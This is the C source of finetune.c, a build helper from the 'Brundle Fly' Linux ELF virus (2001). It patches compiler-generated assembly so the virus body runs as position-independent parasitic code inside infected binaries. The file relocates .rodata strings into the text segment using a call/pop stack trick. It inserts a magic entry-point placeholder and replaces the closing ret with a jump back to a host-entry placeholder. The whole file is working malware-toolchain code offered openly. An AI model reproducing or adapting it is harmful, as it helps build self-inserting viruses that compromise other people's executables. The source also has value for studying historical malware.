/*
 * Brundle Fly - Good-natured Linux ELF virus supporting kernel 2.2 and 2.4
 * Copyright 2001 Konrad Rieck <kr@roqe.org>, Konrad Kretschmer <kk@roqe.org>
 * In memory to Seth Brundle 
 *
 * This is a dirty program! It will parse through the generated assembler
 * output of the virus code and tries to do some dirty patching things. 
 *  - add an entry point 
 *  - add a jump at the end of the virus
 *  - add some pushs and pops for security
 *  - move all data from .rodata into the text segment and catch their
 *    addresses using the stack trick, e.g.
 *    
 *    original:
 *    .text
 *       push [data]
 *       call foobar
 *    .data
 *       data "bla"
 *
 *    fake code: 
 *    .text
 *       jmp label
 *    back:
 *       call foobar       
 *    [...]
 *    label: 
 *       call back
 *       data "data_in_text"
 * 
 * This trick is used to get rid of all data that is not stored inside the
 * text segment at pushed the absolute address of the data onto the stack
 * for further usage, e.g. by functions. 
 *
 * This program is not a fully functional assembler parser, it doesn't work
 * on all generated assembler source. If you experience problems using this
 * program either change your C code or adjust the problems manually. 
 * Sorry.
 *
 * $Id: finetune.c,v 1.5 2001/07/11 18:34:48 kr Exp $
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char **lines;
int lineno = 0;

/*
 * Add a line to our virtual editor environment
 */
void add_line(int l, char *s)
{
    int i;

    if (l < 0 || l > lineno)
	return;

    lineno++;
    lines = (char **) realloc(lines, lineno * sizeof(char *));
    if (!lines) {
	perror("add_line: realloc()");
	exit(EXIT_FAILURE);
    }

    for (i = lineno - 1; i > l && i > 0; i--)
	lines[i] = lines[i - 1];
    lines[l] = strdup(s);
}

/*
 * Remove a line from our virtual editor environment
 */
void del_line(int l)
{
    int i;

    if (l < 0 || l >= lineno)
	return;

    free(lines[l]);
    for (i = l; i < lineno - 1; i++)
	lines[i] = lines[i + 1];
    lineno--;
    lines = (char **) realloc(lines, lineno * sizeof(char *));
    if (!lines) {
	perror("del_line: realloc()");
	exit(EXIT_FAILURE);
    }
}

/*
 * Print a line.
 */
void print_line(int l)
{
    if (l >= 0 && l < lineno)
	printf("%s\n", lines[l]);
}

/*
 * Find a line that matches the pattern s, return the line number for the
 * found line otherwise return -1.
 */
int find_line(char *s)
{
    int i;
    for (i = 0; i < lineno; i++)
	if (strstr(lines[i], s))
	    return i;
    return -1;
}

/*
 * Find a line that matches the pattern s, starting at line l. Return the
 * line line number of the found line otherwise return -1.
 */
int find_line_from(char *s, int l)
{
    int i;
    for (i = l; i < lineno; i++)
	if (strstr(lines[i], s))
	    return i;
    return -1;
}

/*
 * Return a pointer to the line l.
 */
char *get_line(int l)
{
    if (l < 0 || l >= lineno)
	return NULL;
    return lines[l];
}

/*
 * Set the line l.  
 */
void set_line(int l, char *s)
{
    if (l < 0 || l > lineno)
	return;

    if (l == lineno)
	add_line(l, s);

    lines[l] = strdup(s);
}

int main(int argc, char **argv)
{
    FILE *in;
    char str[1024], r[128], t[128];
    int i, j, k, n;
    char *s, *u;

    if (argc != 3) {
	fprintf(stderr, "usage: cnvasm <input-asm> <output-asm>\n");
	return EXIT_SUCCESS;
    }

    lines = (char **) malloc(sizeof(char *));

    if (!(in = fopen(argv[1], "r"))) {
	perror(argv[1]);
	exit(EXIT_FAILURE);
    }

    printf("- Finetuning %s\n", argv[1]);

    printf("- Reading code lines: ");
    while (!feof(in)) {
	fgets(str, 1024, in);
	add_line(lineno, str);
    }
    printf("done\n");

    /*
     * This is the stack trick. Watch for the comments to see how this
     * works. 
     */
    n = find_line(".rodata");
    if (n > -1) {
	printf("- Copying data fields to the text segment: ");

	/* 
	 * After locating the .rodata section, find the .text section
	 * and the end of the code ending with .Lfe. (this is a.out
	 * syntax).
	 */
	k = find_line_from(".text", n);
	j = find_line_from(".Lfe", k);

	/*
	 * Copy each line from the .rodata section starting with .LC
	 * to the text section after the .Lfe mark. In order words 
	 * use a part of the code that is not executed. The code ends
	 * at .Lfe.  
	 */
	for (i = k - 1; i > n; i--) {
	    s = get_line(i);
	    if ((u = strstr(s, ".LC"))) {
		strcpy(s, u + 1);
	    }
	    add_line(j, s);
	    printf(".");
	}

	printf(" done\n");

	/*
	 * Remove the lines copied above from the .rodata section
	 */
	printf("- Removing data fields in the data segment: ");
	for (i = k - 1; i >= n; i--) {
	    del_line(i);
	    printf(".");
	}
	printf(" done\n");

	/*
	 * Find all instruction that used the addresses from .rodata. 
	 */
	printf("- Patching data field addresses (pushl): ");
	for (j = 0, i = 0; (i = find_line_from("pushl $.LC", i)) > -1;
	     j++, i++) {

	    /*
	     * This loop looks for simple "pushl $.LC?" instructions. 
	     * if one is found it is replaced by a sequence of instructions.
	     * See below. 
	     */

	    strncpy(r, strchr(get_line(i), '$') + 2, 128);
	    r[strlen(r) - 1] = 0;

	    /*
	     * Find the line that holds the data for the found .LC? data. 
	     * Remember, those have been copied to the text segment just 
	     * before. 
	     */
	    snprintf(t, 128, "%s:", r);
	    n = find_line(t);

	    /*
	     * Add the call before the definition of .LC?
	     */
	    snprintf(t, 128, "\tcall BF%d\n", j);
	    add_line(n + 1, t);

	    /*
	     * Replace the pushl with a jmp and a label. 
	     */
	    snprintf(t, 128, "\tjmp %s\n", r);
	    set_line(i, t);
	    snprintf(t, 128, "BF%d:\n", j);
	    add_line(i + 1, t);
	    printf(".");
	}
	printf(" done\n");

	printf("- Patching data field addresses (movl): ");
	for (i = 0; (i = find_line_from("movl $.LC", i)) > -1; j++, i++) {

	    /*
	     * This loop looks for simple "movl $.LC?" instructions. 
	     * if one is found it is replaced by a sequence of instructions.
	     * See below. 
	     */

	    strncpy(r, strchr(get_line(i), '$') + 2, 128);
	    r[3] = 0;

	    /*
	     * Find the line that holds the data for the found .LC? data. 
	     * Remember, those have been copied to the text segment just 
	     * before. 
	     */
	    snprintf(t, 128, "%s:", r);
	    n = find_line(t);

	    /*
	     * Add a call before the definition of .LC?
	     */
	    snprintf(t, 128, "\tcall BF%d\n", j);
	    add_line(n + 1, t);

	    /*
	     * Replace the movl with a jmp, a label and a final popl
	     * that retrieves the address from the stack and gets it back
	     * to the register used in the inital movl. 
	     */
	    snprintf(t, 128, "\tjmp %s\n", r);
	    strncpy(r, strchr(get_line(i), '%'), 128);
	    r[strlen(r) - 1] = 0;

	    set_line(i, t);
	    snprintf(t, 128, "BF%d:\n", j);
	    add_line(i + 1, t);

	    snprintf(t, 128, "\tpopl %s\n", r);
	    add_line(i + 2, t);
	    printf(".");
	}
	printf(" done\n");
    }

    /*
     * Add the magic entry point and a pushl dx instruction. Most other
     * register are pushed by default, dx isn't.
     */
    printf("- Adding magic entry point.\n");
    k = find_line("main:");
    add_line(k + 1, "\tpushl %edx\n");
    add_line(k + 1, "\tmovl 0xaffeaffe,%ebp\n");

    /*
     * Prepare the end of the code to hold a placeholder for host_entry
     * and restore the dx register by issuing a popl edx. 
     */
    printf("- Adding magic exit point.\n");
    k = find_line_from("\tret", k);
    set_line(k, "\tjmp *%ebp\n");
    add_line(k, "\tmovl $0xdeadbeef,%ebp\n");
    add_line(k, "\tpop %edx\n");

    fclose(in);

    /*
     * Write the new file. 
     */
    if (!(in = fopen(argv[2], "w"))) {
	perror(argv[2]);
	exit(EXIT_FAILURE);
    }

    for (i = 0; i < lineno; i++)
	fputs(get_line(i), in);

    fclose(in);
    return EXIT_SUCCESS;
}
